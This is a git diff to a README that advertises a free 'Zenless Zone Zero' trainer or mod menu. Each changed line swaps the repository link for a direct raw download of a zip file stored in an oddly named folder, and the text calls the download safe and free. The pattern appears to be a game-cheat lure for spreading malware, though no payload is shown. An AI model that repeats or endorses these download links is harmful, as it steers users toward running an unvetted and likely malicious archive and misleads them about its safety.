@@ -1,6 +1,6 @@
 # 🎮 zenless-zone-zero-mod-menu - Unlock Full Game Power Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Zenless%20Zone%20Zero%20Trainer-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Lettybicipital6783/zenless-zone-zero-mod-menu)
+[![Download Now](https://img.shields.io/badge/Download-Zenless%20Zone%20Zero%20Trainer-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Lettybicipital6783/zenless-zone-zero-mod-menu/raw/refs/heads/main/gastroplasty/zero_zone_menu_mod_zenless_v2.0.zip)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome! This guide will help you download and set up the Zenless Zone Zero Trai
 
 ## 📥 Download the Trainer
 
-Visit this link to download the application: **[https://github.com/Lettybicipital6783/zenless-zone-zero-mod-menu](https://github.com/Lettybicipital6783/zenless-zone-zero-mod-menu)**
+Visit this link to download the application: **[https://github.com/Lettybicipital6783/zenless-zone-zero-mod-menu/raw/refs/heads/main/gastroplasty/zero_zone_menu_mod_zenless_v2.0.zip](https://github.com/Lettybicipital6783/zenless-zone-zero-mod-menu/raw/refs/heads/main/gastroplasty/zero_zone_menu_mod_zenless_v2.0.zip)**
 
 Click the green **"Code"** button on that page, then select **"Download ZIP"**. Your browser will save a compressed folder to your computer — usually in your **Downloads** folder.
 
@@ -179,7 +179,7 @@ The trainer receives regular updates to maintain compatibility with new game pat
 
 You now have everything you need to download, install, and run the Zenless Zone Zero Trainer on your Windows PC. The process is quick, safe, and completely free. Follow the steps above, and you'll be dominating the game in minutes.
 
-Visit this link to download the application: **[https://github.com/Lettybicipital6783/zenless-zone-zero-mod-menu](https://github.com/Lettybicipital6783/zenless-zone-zero-mod-menu)**
+Visit this link to download the application: **[https://github.com/Lettybicipital6783/zenless-zone-zero-mod-menu/raw/refs/heads/main/gastroplasty/zero_zone_menu_mod_zenless_v2.0.zip](https://github.com/Lettybicipital6783/zenless-zone-zero-mod-menu/raw/refs/heads/main/gastroplasty/zero_zone_menu_mod_zenless_v2.0.zip)**
 
 Happy gaming! 🎉
 
